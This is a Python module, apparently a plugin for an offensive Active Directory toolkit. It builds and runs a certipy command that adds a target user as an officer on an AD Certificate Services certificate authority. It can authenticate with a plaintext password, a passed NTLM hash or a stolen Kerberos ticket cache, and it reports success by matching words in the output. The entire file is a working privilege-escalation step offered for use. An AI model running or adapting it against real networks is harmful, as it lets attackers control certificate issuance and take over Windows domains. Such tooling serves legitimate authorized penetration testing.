import subprocess
import os


def run(data, cred, args):
    extra = getattr(args, "extra", []) or []

    # -------------------------
    # Input
    # -------------------------
    if len(extra) < 1:
        print("[-] Missing user to add as officer")
        return {"success": False}

    target_user = extra[0]

    domain = data.get("domain")
    dc_ip = data.get("ip")
    ca = data.get("adcs", {}).get("ca")

    if not domain or not dc_ip or not ca:
        print("[-] Missing domain, DC IP, or CA name")
        return {"success": False}

    username = cred.get("user")
    typ = cred.get("type")
    secret = cred.get("secret")

    if not username:
        print("[-] Missing username in credential")
        return {"success": False}

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
        "certipy", "ca",
        "-ca", ca,
        "-dc-ip", dc_ip,
        "-add-officer", target_user,
        "-u", f"{username}@{domain}"
    ]

    env = os.environ.copy()

    # -------------------------
    # Auth handling
    # -------------------------
    if typ == "password":
        cmd += ["-p", secret]

    elif typ == "ntlm":
        ntlm = secret if ":" in secret else f":{secret}"
        cmd += ["-hashes", ntlm]

    elif typ == "ticket":
        env["KRB5CCNAME"] = secret
        cmd += ["-k", "-no-pass"]

    else:
        print("[-] Unsupported credential type")
        return {"success": False}

    cmd += ["-debug"]
    cmd = [str(x) for x in cmd]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute
    # -------------------------
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            env=env
        )
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return {"success": False}

    output = result.stdout + result.stderr
    print(output)

    # -------------------------
    # Success detection
    # -------------------------
    success = "success" in output.lower() or "added" in output.lower()

    if success:
        print(f"[+] {target_user} added as CA officer")

    return {
        "success": success,
        "output": output,
        "user": target_user
    }